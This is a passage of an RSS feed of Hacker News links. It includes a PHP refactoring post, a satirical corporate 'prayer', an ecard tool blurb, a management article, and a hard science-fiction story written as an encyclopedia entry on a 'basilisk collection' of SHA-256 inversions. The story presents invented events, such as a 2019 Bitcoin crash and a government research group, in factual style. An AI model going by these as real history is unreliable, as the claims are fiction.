<p>Our simple vaccine with a basic method is now <strong>powerful service locator</strong> that can vaccinate itself and order itself. It's like <strong>giving birth to yourself</strong>.</p>

<p>What happened? In a factory, someone had an idea to put the services right into vaccine itself:</p>
<pre><code> final class Vaccine
 {
     public function __construct(
         private string $uuid,
         private float $volume,
+        private VaccinatingService $vaccinatingService,
+        private OrderingService $orderingService,
    ) {
    }
 }</code></pre>
<p>That's not a way to go.</p>
<h3 id="how-to-refactor">How to Refactor?</h3>
<p>It can happen to anyone. I'm aware of 3 such places in Rector itself that we plan to refactor. What can we do about it?</p>
<p>Let's refactor service from the object...</p>
<pre><code> final class Vaccine
 {
     public function __construct(
         private string $uuid,
         private float $volume,
-        private VaccinatingService $vaccinatingService,
-        private OrderingService $orderingService,
    ) {
    }
 }</code></pre>
<p>...to service using the object:</p>
<pre><code>+$orderingService = new OrderingService();
+$vaccinatingService = new VaccinatingService();

-$vaccine-&gt;orderNewOne();
+$orderingService-&gt;order($vaccine, 100);

-$vaccine-&gt;vaccinateHuman($human);
+$vaccinatingService-&gt;vaccinate($human);

-$vaccine-&gt;vaccinateAnimal($animal);
+$vaccinatingService-&gt;vaccinate($animal);</code></pre>

<h2 id="2-trait-adding-dependency">2. Trait adding Dependency</h2>
<p>Let's stay with a vaccine from previous example. We got into the same problem:</p>
<pre><code>$vaccine-&gt;orderNewOne();
$vaccine-&gt;vaccinateHuman($human);
$vaccine-&gt;vaccinateAnimal($animal);</code></pre>
<p>But the constructor seems correct:</p>
<pre><code>final class Vaccine
{
    public function __construct(
        private string $uuid,
        private float $volume
    ) {
    }
}</code></pre>
<p>What is going on?</p>
<pre><code>final class Vaccine
{
    use SomeHelperTrait;
}</code></pre>
<p>Hm... what is that?</p>
<pre><code>trait SomeHelperTrait
{
    /**
     * In Symfony
     * @required
     */
    public OrderingService $orderingService;

    /**
     * In Nette
     * @inject
     */
    public VaccinatingsService $vaccinatingsService;
}</code></pre>
<p>Oh, so it's using frameworks (Nette/Symfony) dependency injection to add dependencies... how <del>smart</del> bush coding!</p>

<p>To be honest, I put similar crap code into Rector. Shame on me. It took <a href="https://github.com/rectorphp/rector/pull/5385">bunch</a> <a href="https://github.com/rectorphp/rector/pull/5466">of</a> <a href="https://github.com/rectorphp/rector/pull/5383">pull</a> <a href="https://github.com/rectorphp/rector/pull/5384">request</a> to get rid of completely.</p>
<h3 id="how-to-refactor">How to Refactor?</h3>
<p>The same way as the example above. Get rid of traits...</p>
<pre><code> final class Vaccine
 {
-    use SomeHelperTrait;
 }</code></pre>
<p>...and use services to handle the service work:</p>
<pre><code>$orderingService = new OrderingService();
$vaccinatingService = new VaccinatingService();

$orderingService-&gt;order($vaccine, 100);
$vaccinatingService-&gt;vaccinate($human);
$vaccinatingService-&gt;vaccinate($animal);</code></pre>

<p>After this incident, we <a href="https://github.com/symplify/phpstan-rules/blob/master/docs/rules_overview.md#notraitrule">forbid trait completely</a> with PHPStan.</p>
<h2 id="3-using-nette-template-to-transfer-data">3. Using Nette Template to Transfer Data</h2>
<p>Last but not least, there are template objects. It about any object that magically <strong>sets its variables on the fly</strong>:</p>
<pre><code>$someObject = new stdClass;
$someObject-&gt;name = 'Maybe' + 'Some';
$someObject-&gt;age = '100';</code></pre>
<p>It's common to use these on unknown JSON response, but here <strong>these variable names ("name", "age") and their values are known</strong>.</p>

<p>I don't think Symfony or Laravel have those, but it's a typical code from Nette controller:</p>
<pre><code>use Nette\Application\UI\Presenter;

final class DoctorPresenter extends Presenter
{
    public function renderInstructions()
    {
        $this-&gt;template-&gt;welcomeHere = '...';
        $this-&gt;template-&gt;waitingRoom = '...';
    }
}</code></pre>
<p>The <code>$template</code> is a base template object that holds assigned variables magically. Instead of a service locator, we have <strong>a variable locator</strong> (not good).
This simple construction of 2 variables is ok, but it will grow to a dirty bug.</p>

<p>To give you a comparison, this is how Symfony handles the problem:</p>
<pre><code>use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

final class DoctorController extends AbstractController
{
    public function renderInstructions()
    {
        $this-&gt;render(__DIR__ . '/template/doctor/instructions.twig', [
            'welcomeHere' =&gt; '...',
            'waitingRoom' =&gt; '...',
        ]);
    }
}</code></pre>
<p>We pass parameters into template <strong>exactly once</strong>, at <strong>the time where it's needed</strong>. Not sooner, not later, <a href="https://blog.codinghorror.com/the-just-in-time-theory/">just in time</a>, also called JIT.</p>
<p>Not twice by accident:</p>
<pre><code>$this-&gt;template-&gt;welcomeHere = '...';

// 100 lines bellow or in another method called
$this-&gt;template-&gt;welcomeHere = 'no';

// which is used?</code></pre>
<p>...and not maybe:</p>
<pre><code>if ($this-&gt;isOpened) {
    $this-&gt;template-&gt;welcomeHere = '...';
}</code></pre>

<p>Still, so far, that is framework convention it works well when used correctly.</p>
<p><strong>But what is not forbidden is allowed.</strong> We can use the object for reading the data:</p>
<pre><code>use Nette\Application\UI\Presenter;

final class DoctorPresenter extends Presenter
{
    public function renderInstructions()
    {
        $this-&gt;template-&gt;welcomeHere = '...';

        if ($this-&gt;template-&gt;welcomeHere === '...') {
            $this-&gt;template-&gt;welcomeHere .= PHP_EOL. 'Thank you!';
        }
    }
}</code></pre>
<p>This is very bad idea:</p>
<ul>
<li>
<p>we depend on <code>$this-&gt;template-&gt;welcomeHere</code> to <strong>be set somewhere above</strong> - how do you even check if magic property is set?</p>
<pre><code>if (isset($this-&gt;template-&gt;welcomeHere) &amp;&amp; $this-&gt;template-&gt;welcomeHere !== null) {
$this-&gt;template-&gt;welcomeHere .= PHP_EOL . 'Thank you!';
}</code></pre>
</li>
<li>
<p>we knew we assigned type of <code>string</code>, but <strong>magic made the type disappear</strong></p>
</li>
<li>
<p>we have no idea what the type is, <strong>static analysis and Rector does not work</strong></p>
</li>
<li>
<p>we're promoting to use a magical object for anything in <code>render()</code> methods</p>
</li>
<li>
<p>we're saying it's ok <strong>to set a single variable twice in one method</strong></p>
</li>
</ul>

<h3 id="how-to-refactor">How to Refactor?</h3>
<p>How can we get out of this bush? It's simpler than the two examples before. What would you do?</p>
<p>Use a variable, of course.</p>
<pre><code>-$this-&gt;template-&gt;welcomeHere = '...';
+$welcomeHere = '...';

-if ($this-&gt;template-&gt;welcomeHere === '...') {
+if ($welcomeHere === '...') {
-    $this-&gt;template-&gt;welcomeHere .= PHP_EOL. 'Thank you!';
+    $welcomeHere .= PHP_EOL. 'Thank you!';
-}

+$this-&gt;template-&gt;welcomeHere = $welcomeHere;</code></pre>
<p>This way we:</p>
<ul>
<li>use a variable for a <em>variable</em> content (a content that might change and ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tomasvotruba.com/blog/2021/02/11/tree-coding-vs-bush-coding/">https://tomasvotruba.com/blog/2021/02/11/tree-coding-vs-bush-coding/</a></em></p>]]>
            </description>
            <link>https://tomasvotruba.com/blog/2021/02/11/tree-coding-vs-bush-coding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136224</guid>
            <pubDate>Sun, 14 Feb 2021 21:00:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Basilisk Collection ‚Äì A Hard Sci-Fi Story About SHA-256]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26136206">thread link</a>) | @blackle
<br/>
February 14, 2021 | https://suricrasia.online/unfiction/basilisk/ | <a href="https://web.archive.org/web/*/https://suricrasia.online/unfiction/basilisk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" dir="ltr" lang="en"><div>
<p>The <b>basilisk collection</b> (also known as the <b>basilisk file</b> or <b>basilisk.txt</b>) is a collection of over 125 million <a href="https://en.wikipedia.org/wiki/Proof_of_work#Background" title="Proof of work">partial hash inversions</a> of the <a href="https://en.wikipedia.org/wiki/SHA-256" title="SHA-256">SHA-256</a> <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function" title="Cryptographic hash function">cryptographic hash function</a>. Assuming state-of-the art methods were used to compute the inversions, the entries in the collection collectively represent a <a href="https://en.wikipedia.org/wiki/Proof-of-work" title="Proof-of-work">proof-of-work</a> far exceeding the computational capacity of the human race.<sup id="cite_ref-calc_1-0"><a href="#cite_note-calc-1">[1]</a></sup><sup id="cite_ref-killed_2-0"><a href="#cite_note-killed-2">[2]</a></sup> The collection was released in parts through <a href="https://en.wikipedia.org/wiki/BitTorrent" title="BitTorrent">BitTorrent</a> beginning in June 2018, although it was not widely reported or discussed until early 2019.<sup id="cite_ref-history_3-0"><a href="#cite_note-history-3">[3]</a></sup> On August 4th, 2019 the complete collection of 125,552,089 known hash inversions was compiled and published by <a href="https://en.wikipedia.org/wiki/University_of_Toronto#CryTor" title="University of Toronto">CryTor</a>, the cybersecurity lab of the <a href="https://en.wikipedia.org/wiki/University_of_Toronto" title="University of Toronto">University of Toronto</a>.<sup id="cite_ref-toronto_4-0"><a href="#cite_note-toronto-4">[4]</a></sup>
</p><p>The existence of the basilisk collection has had wide reaching consequences in the field of cryptography, and has been blamed for catalyzing the <a href="https://en.wikipedia.org/wiki/Bitcoin#Basilisk_crash" title="Bitcoin">January 2019 Bitcoin crash</a>.<sup id="cite_ref-killed_2-1"><a href="#cite_note-killed-2">[2]</a></sup><sup id="cite_ref-bitcoin-general_5-0"><a href="#cite_note-bitcoin-general-5">[5]</a></sup><sup id="cite_ref-6"><a href="#cite_note-6">[6]</a></sup>
</p>


<h2><span id="Background">Background</span></h2>
<h3><span id="Hash_functions">Hash functions</span></h3>

<p>A <a href="https://en.wikipedia.org/wiki/Hash_function" title="Hash function">hash function</a> is a mathematical function that takes an input (or "message") of arbitrary length and computes a fixed size output, often a number within a defined range. This output is often called the "hash", "digest", or "checksum." A cryptographic hash function is a hash function with additional requirements that make it suitable for use in <a href="https://en.wikipedia.org/wiki/Cryptography" title="Cryptography">cryptography</a>.
</p><p>The ideal cryptographic hash function has five main properties:
</p>
<ul><li><b><a href="https://en.wikipedia.org/wiki/Deterministic_algorithm" title="Deterministic algorithm">Determinism</a></b>: the same message always results in the same hash.</li>
<li><b>Efficiency</b>: it is quick to compute the hash value for any given message.</li>
<li><b><a href="https://en.wikipedia.org/wiki/One-way_function" title="One-way function">One-way</a></b>: it is intractable to generate a message that yields a given hash value.</li>
<li><b><a href="https://en.wikipedia.org/wiki/Avalanche_effect" title="Avalanche effect">Avalanche effect</a></b>: a small change to a message results in a completely dissimilar output.</li>
<li><b><a href="https://en.wikipedia.org/wiki/Collision_resistance" title="Collision resistance">Collision resistance</a></b>: it is infeasible to find two different messages with the same hash value.</li></ul>
<p><a href="https://en.wikipedia.org/wiki/SHA-256" title="SHA-256">SHA-256</a> is one such hash function designed by the United States <a href="https://en.wikipedia.org/wiki/National_Security_Agency" title="National Security Agency">National Security Agency</a> (NSA), one of six functions in the SHA-2 (Secure Hash Algorithm 2) family. The 256 refers to the number of bits in the computed digest.<sup id="cite_ref-7"><a href="#cite_note-7">[7]</a></sup>
</p>
<h3><span id="Proof_of_work_systems">Proof of work systems</span></h3>

<p>Hash functions are often used as the basis for proof of work systems. A proof of work is any certificate or signature that implies some quantity of computation was performed. A partial hash inversion is one such example, wherein a <a href="https://en.wikipedia.org/wiki/Cryptographic_nonce" title="Cryptographic nonce">nonce value</a> must be found such that‚Äîwhen concatenated with a challenge string‚Äîthe resulting hash is below some target value. Lower target values require more computations on average to find an appropriate nonce, and so a proof of work system can be made more difficult by decreasing its target value.
</p><p>For example, suppose the challenge was "ABC" and the target value was 2<sup>224</sup>. To generate the proof of work, one must find a value N such that SHA-256("ABC" || N) &lt; 2<sup>224</sup>. Because SHA-256 is believed to have <a href="https://en.wikipedia.org/wiki/Preimage_resistance" title="Preimage resistance">preimage resistance</a>, there should be no way to find a value for N that is more efficient than picking values at random until a sufficient value is found. For the target value of 2<sup>224</sup>, this is expected to take on average 2<sup>32</sup> hash evaluations. It is entirely possible for a value to be found with fewer than 2<sup>32</sup> hash evaluations; however the likelihood of this occurring falls off exponentially as the number of calculated hashes decreases.<sup id="cite_ref-8"><a href="#cite_note-8">[8]</a></sup><sup id="cite_ref-9"><a href="#cite_note-9">[9]</a></sup>
</p><p>In general, for a hash of N bits, a target value of 2<sup>K</sup> would require on average 2<sup>(N-K)</sup> hash evaluations to find a corresponding nonce value.
</p>
<h2><span id="Description">Description</span></h2>
<p>The largest basilisk collection includes 125,552,089 partial hash inversions of the SHA-256 algorithm applied twice.<sup id="cite_ref-toronto_4-1"><a href="#cite_note-toronto-4">[4]</a></sup> These inversions follow a particular pattern. Using the language of proof-of-work systems: the inversions use the challenge string "basilisk:N:" where N is a 10 digit number and the target value is no less than 2<sup>168</sup>. The value for N begins at 0 and increases monotonically to 499,999,999. Because there are only 125 million hashes in the collection, several ranges for N are missing. The generated nonce values are 64 characters in length and are alphanumeric including capitals.
</p><p>The first five entries in the collection are:
</p>
<pre>basilisk:0000000000:ds26ovbJzDwkVWia1tINLJZ2WXEHBvItMZRxHmYhlQd0spuvPXb6cYFJorDKkqlA 0000000000000000000000161b9f84a187cc21b172bf68b3cb3b78684d8e9f17
basilisk:0000000001:dMHUhnoEkmLv8TSE1lnJ7nVIYM8FLYBRtzTiJCM8ziijpTj95MPptu6psZZyLBVA 0000000000000000000000cee5fe5df2d3034fff435bb40e8651a18d69e81460
basilisk:0000000002:aSCZwTSmH9ZtqB5gQ27mcGuKIXrghtYIoMp6aKCLvxhlf1FC5D1sZSi2SjwU9EqK 000000000000000000000012aabd8d935757db173d5b3e7ae0f25ea4eb775402
basilisk:0000000003:oeocInD9uFwIO2x5u9myS4MKQbFW8Vl1IyqmUXHV3jVen6XCoVtuMbuB1bSDyOvE 000000000000000000000039d50bb560770d051a3f5a2fe340c99f81e18129d1
basilisk:0000000004:m0EyKprlUmDaW9xvPgYMz2pziEUJEzuy6vsSTlMZO7lVVOYlJgJTcEvh5QVJUVnh 00000000000000000000002ca8fc4b6396dd5b5bcf5fa80ea49967da55a8668b
</pre>
<p>These plaintext and hash pairs can be verified with the <a href="https://en.wikipedia.org/wiki/OpenSSL" title="OpenSSL">OpenSSL</a> software library:
</p>
<div dir="ltr"><pre><span></span><span>$</span> <span>echo</span> -en <span>'basilisk:0000000000:ds26ovbJzDwkVWia1tINLJZ2WXEHBvItMZRxHmYhlQd0spuvPXb6cYFJorDKkqlA'</span> <span>|</span> openssl dgst -sha256 -binary <span>|</span> openssl dgst -sha256
<span>(stdin)</span><span>= 0000000000000000000000161b9f84a187cc21b172bf68b3cb3b78684d8e9f17</span>
</pre></div>
<p>Aside from the word "basilisk" being included in every hash inversion, no other messages or text are included in the primary sources for the basilisk collection. Some hoax collections have appeared with text added to the start or end, however in every case an earlier source could be found with no extra text.<sup id="cite_ref-toronto_4-2"><a href="#cite_note-toronto-4">[4]</a></sup>
</p>
<h2><span id="History">History</span></h2>
<p>A small subset of the basilisk collection first appeared on the internet sometime before June 2018.<sup id="cite_ref-history_3-1"><a href="#cite_note-history-3">[3]</a></sup> This subset included 15,000 partial hash inversions and was distributed on the <a href="https://en.wikipedia.org/wiki/BitTorrent" title="BitTorrent">BitTorrent network</a>. Although the file was made available for several months and gathered a small collection of seeding clients,<sup id="cite_ref-dht-telescope_10-0"><a href="#cite_note-dht-telescope-10">[10]</a></sup> no public discussion of the basilisk hashes could be found before early December 2018, and it is likely that these original seeders were automated <a href="https://en.wikipedia.org/wiki/Seedbox" title="Seedbox">seedboxes</a> or BitTorrent indexing services.<sup id="cite_ref-11"><a href="#cite_note-11">[11]</a></sup><sup id="cite_ref-history_3-2"><a href="#cite_note-history-3">[3]</a></sup> Throughout 2018 larger subsets of the basilisk collection continued to appear on the BitTorrent network. The largest subset, constituting 15 million hashes beginning with id 83,000,000, was first indexed mid December 2018.<sup id="cite_ref-dht-telescope_10-1"><a href="#cite_note-dht-telescope-10">[10]</a></sup><sup id="cite_ref-timeline_12-0"><a href="#cite_note-timeline-12">[12]</a></sup> This subset was discussed at length and its <a href="https://en.wikipedia.org/wiki/Magnet_URI_scheme" title="Magnet URI scheme">magnet link</a> passed around within the cryptographic community.<sup id="cite_ref-break1_13-0"><a href="#cite_note-break1-13">[13]</a></sup> Early in the new year, a number of internet news outlets broke the story on the security implications of the basilisk collection, bringing it to the attention of the wider public.<sup id="cite_ref-timeline_12-1"><a href="#cite_note-timeline-12">[12]</a></sup><sup id="cite_ref-break1_13-1"><a href="#cite_note-break1-13">[13]</a></sup><sup id="cite_ref-14"><a href="#cite_note-14">[14]</a></sup><sup id="cite_ref-break3_15-0"><a href="#cite_note-break3-15">[15]</a></sup>
</p><p>By the end of January 2019 the basilisk collection was known to have 76 million partial hash inversions, and throughout 2019 this number increased to 125 million as more subsets were discovered.<sup id="cite_ref-timeline_12-2"><a href="#cite_note-timeline-12">[12]</a></sup> These subsets were gathered by the <a href="https://en.wikipedia.org/wiki/University_of_Toronto#CryTor" title="University of Toronto">University of Toronto Cryptography Lab</a> (CryTor) into a definitive collection on August 4th, 2019.<sup id="cite_ref-toronto_4-3"><a href="#cite_note-toronto-4">[4]</a></sup> There remains roughly 200 possible basilisk subsets which were indexed by the <a href="https://en.wikipedia.org/wiki/Mainline_DHT" title="Mainline DHT">BitTorrent distributed hash table</a> but were never downloaded before the initial seeder or seeders went offline. This is believed to account for the missing 374,447,910 hash inversions.<sup id="cite_ref-toronto2_16-0"><a href="#cite_note-toronto2-16">[16]</a></sup>
</p>
<h2><span id="Cryptanalysis_and_validation">Cryptanalysis and validation</span></h2>
<p>The 125,552,089 plaintext and hash pairs in the basilisk collection can be readily verified on a standard desktop computer with appropriate cryptographic software such as <a href="https://en.wikipedia.org/wiki/OpenSSL" title="OpenSSL">OpenSSL</a>. This can take anywhere from a couple of seconds to a couple of minutes depending on the machine.<sup id="cite_ref-17"><a href="#cite_note-17">[17]</a></sup> Creating the hashes, on the other hand, would have required a computer orders of magnitude more powerful than any computer or network of computers that currently exist. For perspective, one generous estimate for the combined power of all the computers ever made is 1 <a href="https://en.wikipedia.org/wiki/FLOP" title="FLOP">zettaFLOP</a>, or 10<sup>21</sup> floating point operations per second.<sup id="cite_ref-calc_1-1"><a href="#cite_note-calc-1">[1]</a></sup> If we assume that one hash corresponds to one floating point operation (another very generous assumption) then the time it would take to generate a set of 125 million hashes is roughly 2 million years.<sup id="cite_ref-calc_1-2"><a href="#cite_note-calc-1">[1]</a></sup> Therefore, there must be a fault in the SHA-256 algorithm that would allow for a faster generation of partial hash inversions.
</p><p>Cryptanalysis of the basilisk hashes fall into one of two categories: analysis of the SHA-256 algorithm and analysis of 125 million hashes themselves.
</p>
<h3><span id="SHA-256_cryptanalysis">SHA-256 cryptanalysis</span></h3>
<p>SHA-256 is built using the <a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction" title="Merkle‚ÄìDamg√•rd construction">Merkle‚ÄìDamg√•rd structure</a>. To compute the hash, the message is separated into fixed length blocks and each individual block is incorporated into an internal state using a <a href="https://en.wikipedia.org/wiki/One-way_compression_function" title="One-way compression function">one-way compression function</a>. This compression function is applied many times, referred to as "rounds." For SHA-256, 64 rounds are employed for each block.
</p><p>No cryptographic attacks against the preimage resistance of SHA-256 are currently known for all 64 rounds. The best known attacks are for 52 of the 64 rounds. That is, for a reduced version of the function that only uses 52 rounds, there exist algorithms to invert a hash in less time than <a href="https://en.wikipedia.org/wiki/Brute_force" title="Brute force">brute force</a>.<sup id="cite_ref-18"><a href="#cite_note-18">[18]</a></sup>
</p><p>Although there is an abundance of cryptoanalytic research into the SHA-256 hash function, the same cannot be said for the double-SHA-256 function that the basilisk collection uses. This use of a "doubled" hash function is not a novel invention; hash doubling was initially proposed by Ferguson and Schneier in "Practical Cryptography"<sup id="cite_ref-19"><a href="#cite_note-19">[19]</a></sup> and is used in a variety of applications, most notably the <a href="https://en.wikipedia.org/wiki/Bitcoin" title="Bitcoin">Bitcoin</a> <a href="https://en.wikipedia.org/wiki/Cryptocurrency" title="Cryptocurrency">cryptocurrency</a>.<sup id="cite_ref-paper_20-0"><a href="#cite_note-paper-20">[20]</a></sup> The rationale behind the double application of a hash function is to provide resistance against <a href="https://en.wikipedia.org/wiki/Length_extension_attack" title="Length extension attack">length extension attacks</a>. The effect double hashing may have on preimage resistance of SHA-256 was largely unexplored until after the emergence of the basilisk collection.<sup id="cite_ref-paper1_21-0"><a href="#cite_note-paper1-21">[21]</a></sup><sup id="cite_ref-22"><a href="#cite_note-22">[22]</a></sup>
</p><p>Since 2019, research on doubled SHA-256 has increased dramatically. In February 2019 the <a href="https://en.wikipedia.org/wiki/Cryptographic_Module_Validation_Program#Double_SHA256_Special_Interest_Group" title="Cryptographic Module Validation Program">Double SHA256 Special Interest Group</a> (DSHASIG) was formed jointly within the <a href="https://en.wikipedia.org/wiki/National_Institute_of_Standards_and_Technology" title="National Institute of Standards and Technology">National Institute of Standards and Technology</a> (NIST), the <a href="https://en.wikipedia.org/wiki/Communications_Security_Establishment" title="Communications Security Establishment">Communications Security Establishment</a> (CSE), and the <a href="https://en.wikipedia.org/wiki/National_Security_Agency" title="National Security Agency">National Security Agency</a> (NSA). The intent of the DSHASIG is to accelerate research into preimage attacks of doubled SHA-256.<sup id="cite_ref-23"><a href="#cite_note-23">[23]</a></sup> Other organizations such as the <a href="https://en.wikipedia.org/wiki/Bitcoin_Foundation" title="Bitcoin Foundation">Bitcoin Foundation</a> have created funding ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://suricrasia.online/unfiction/basilisk/">https://suricrasia.online/unfiction/basilisk/</a></em></p>]]>
            </description>
            <link>https://suricrasia.online/unfiction/basilisk/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136206</guid>
            <pubDate>Sun, 14 Feb 2021 20:59:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Open Ecard Generator ‚Äì Free, persistent, serverless ecards]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136146">thread link</a>) | @dohliam
<br/>
February 14, 2021 | https://dohliam.github.io/ecards/ | <a href="https://web.archive.org/web/*/https://dohliam.github.io/ecards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
          <p>The default ("create") page provides a simple interface to design your electronic greeting card. The message text, card image, background colour and pattern, and sender and receiver names can all be customized. Your card will appear in an automatically-updating preview at the bottom of the screen as you begin to edit it. Press the "Toggle preview" button to turn off the preview feature.</p>

          <p>While you are designing your card, a link will appear to the final card. You can share this link (which goes to the "receive" page) with anyone you would like to send the card to.</p>

          <p>All of your customizations are encoded in the url, so the card contents will not expire or change as long as the site is up (and even if the site goes down, you can still retrieve your card by downloading the generator and importing the link.)</p>

          <p>The card generation and retrieval process is done entirely locally, so none of the card contents is ever stored anywhere on any server.</p>
        </section></div>]]>
            </description>
            <link>https://dohliam.github.io/ecards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136146</guid>
            <pubDate>Sun, 14 Feb 2021 20:51:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Prayer to the Global Corporate Gods]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26136026">thread link</a>) | @Bluestein
<br/>
February 14, 2021 | http://donhodges.com/prayer.html | <a href="https://web.archive.org/web/*/http://donhodges.com/prayer.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="750" height="1040" xpos="0" content="" csheight="1040">
						<center>
							<img src="http://donhodges.com/images/fish3.gif" height="47" width="99">
							
						</center>
						<p>O mighty global corporations, we are helpless without you. Please bring your menial jobs here to our nation and town. Though we have little control over these arbitrary and tedious jobs that create wealth for stockholders rather than us, they are all that we lowly workers deserve. Grant us your x dollars per hour so that we might have hope of purchasing your fine plastic products that bestow lasting contentment. Forgive us when we question your authority or do not work fast enough, for we are but wretched servants, and please oh pretty please do not cast us onto the street where there is much weeping and knashing of teeth.</p>
						<p>Drive us to serve you ever more diligently until our decrepit bodies and minds break down, then patch us up in your hospitals and with your anti-depressants as much as necessary to return to your service. And when you have used us up completely, secure us in your nursing homes so that we do not annoy you or your still-faithful devotees further.</p>
						<p>O corporate one big happy family Fathers, some of us are so worthless that our skills do not match your product plans, and our resultant poverty has led us astray to where we have broken the righteous commandments that protect your bountiful property from us. Other backsliders have foolishly attempted to escape the indoctrination of your dollars through the use of mind altering substances. We accept that the only rightful place for these shameful sinners among us is in a cold cell of thick concrete deep within your prisons, where you will still mercifully grace these human by-products with a few quarters per hour to manufacture your office furniture.</p>
						<p>For those few hours when we are not in your service, thank you for blessing us all with the security of predictable name brand products, and for their copious packaging that assures that no heathens have laid their unclean hands on the wondrous gifts within. Continue to spew your intelligent poisons into our farmland and food to protect us from the sinister insects and microorganisms. Prepare our food and even serve it to us, that we may have more time to serve you. We will gladly consume whatever you hand down to us, for you are all-knowing.</p>
						<p>Please pacify us with a plethora of prefabricated entertainment, as we have forgotten how to entertain each other. Reveal to us through your inspired media what we are to believe, for surely we cannot trust our own feeble judgement. Similarly commodify any remaining life activities, so that our angst-ridden existence is no more challenging than a series of multiple-choice questions.</p>
						<p>Most important, guide your wise politicians financially as they strive to make this region of the planet more cost-effective for you by abolishing the evil worker rights laws, corporate taxation, and environmental protections that offend you deeply and drive you away from us. Help them enlighten the more backward cultures by dropping your holy bombs on the people of those demonic nation-states that still refuse to bow down before you. And thank you for undercutting the pitifully small local businesses that would dare defy your divine dominance and threaten the sacred homogenous culture in which you have safely wrapped us. Truly all resources belong to you, and we are but humble stewards of them. Continue to devour the land and excrete into the rivers --- the Earth is your banquet and your toilet. For thine is the empire, the power, and the planet, until you destroy it.</p>
						<p>Amen.</p>
						<p>Copyright 1996 BiggerTheyCome (TM) Enterprises, a wholly-owned subsidiary of GlobalGobble Corporation. Just try and steal this intellectual property, you peasant, and see what happens!</p>
						<p>In accordance with Title 17 U.S.C. Section 107, this material is distributed without profit to those who have expressed a prior interest in receiving the included information for research and educational purposes.</p>
						<p>/s/ Mike Dolan, Field Director, Global Trade Watch, Public Citizen mdolan@citizen.org http://www.tradewatch.org 202.546.4996 fax:547.7392</p>
						<p>Join the Global Trade Watch list server. We will keep you up to date on trade policy and politics. To subscribe, send this message: "SUBSCRIBE TW-LIST" [followed by your name, your organizational affiliation and the state in which you live] to LISTPROC@ESSENTIAL.ORG
					</p></div></div>]]>
            </description>
            <link>http://donhodges.com/prayer.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136026</guid>
            <pubDate>Sun, 14 Feb 2021 20:35:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Effectively Manage an Existing Engineering Team]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26135955">thread link</a>) | @strife25
<br/>
February 14, 2021 | https://buildthestage.com/how-to-manage-existing-engineering-teams/ | <a href="https://web.archive.org/web/*/https://buildthestage.com/how-to-manage-existing-engineering-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><section id="primary"><main id="main"><article id="post-531"><div><p>Here you are, sitting in your regular 1-1 with your boss. You expected it would be a routine check-in with her ‚Äì ‚ÄúHow have you been?‚Äù, ‚ÄúWhat‚Äôs the latest status on yesterday‚Äôs support bug?‚Äù. Then she gets to her update.</p><p>Dale, a peer manager, has decided to leave the company.</p><p>You will be leading their team of mobile engineers until further notice. You know nothing about building mobile apps ‚Äì you‚Äôve been a backend engineer your entire career. There are many unknowns. Kotlin, Swift, and their frameworks are foreign to you. You don‚Äôt know the team, and some of the engineers are older and more experienced than you.</p><p>This is a daunting situation for new leaders and managers. An unfamiliar domain, you don‚Äôt have any answers to questions, and some of the team are ten years your senior. How do you manage an existing engineering team that works in a different domain?</p><h2><strong>Accept that the team knows more than you</strong></h2><p>The first step is to accept that you don‚Äôt know anything about this existing team‚Äôs domain.</p><p>Next, remember what your job is. Your job is to help guide people to make better decisions, learn fast, and achieve goals. Not contribute code.</p><p>Pay attention to how the team communicates. What are the relationships within the team? Who influences decisions? Whose voice is not heard? Your first step is to understand how this team works and how the people on it collaborate.</p><p>By focusing on how the team collaborates you can work on the problems with the environment. These are the issues that few are paying attention to or don‚Äôt know how to address. Solving these problems is where you can contribute most to the team‚Äôs success.</p><h2><strong>Ask questions instead of giving answers</strong></h2><p>Asking questions is a core skill of great leaders.</p><p>When someone is talking, stop thinking about how you want to respond. Instead, listen. Look for details in what they are saying that give you a new question.</p><p>By focusing on questions, you achieve two things. First, you get the other person to talk more and give you more information on the topic. Answering questions will also build trust ‚Äì which is a critical resource for a to earn.</p><p>After a while, some of these questions will become redundant. What do you do when you have a deep understanding of the situation?</p><p>Ask more questions!</p><p>I know ‚Äì it‚Äôs redundant, but your questions change at this point. Focus more on asking questions that guide the group towards the goal of the conversation. For example, take a meeting that requires a decision is made. Your questions should look to identify the detail that‚Äôs preventing the decision.</p><p>Example questions include:</p><ul><li>What are the trade-offs and risks of each choice?</li><li>Who can we talk to to learn more?&nbsp;</li><li>How does this solution affect our team‚Äôs goals?&nbsp;</li></ul> <h2><strong>Partner with influential team members</strong></h2><p>Building trust with the team is critical to your success. You will need to build this through relationships with everyone on the team. The most important people to focus on are the influential ones.</p><p>These are the people everyone listens to. They mentor the rest of the team and help them grow. Decisions change once they raise their concerns. You won‚Äôt make any progress without them on your side.</p><p>How do you go about doing this?</p><p>You need to change your mindset of how you expect these relationships to be. Instead of being a coach, look to them as partners. This means you have to give them the space to own decisions in the domains where they are the experts. The partnership also requires transparency from you. Talk with these people about the problems you are observing on the team and see how they can help.</p><p>By agreeing on the problems in the environment, you will have the support needed to 